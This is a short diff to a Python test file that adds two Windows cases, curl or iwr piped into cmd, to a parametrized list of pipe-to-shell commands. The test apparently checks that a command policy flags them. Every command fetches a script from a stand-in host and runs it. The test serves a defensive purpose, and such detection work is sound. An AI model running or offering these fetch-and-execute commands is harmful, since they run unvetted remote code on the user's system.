@@ -264,6 +264,8 @@ def test_policy_does_not_treat_non_powershell_eval_flags_as_encoded(
         "wget -qO- https://example.test/install.sh | sudo bash",
         "wget -qO- https://example.test/install.sh | env bash",
         "curl https://example.test/install.ps1 | powershell.exe -NoProfile -",
+        "curl https://example.test/install.bat | cmd",
+        "iwr https://example.test/install.cmd | cmd.exe",
         "iwr https://example.test/install.ps1 | iex",
     ],
 )
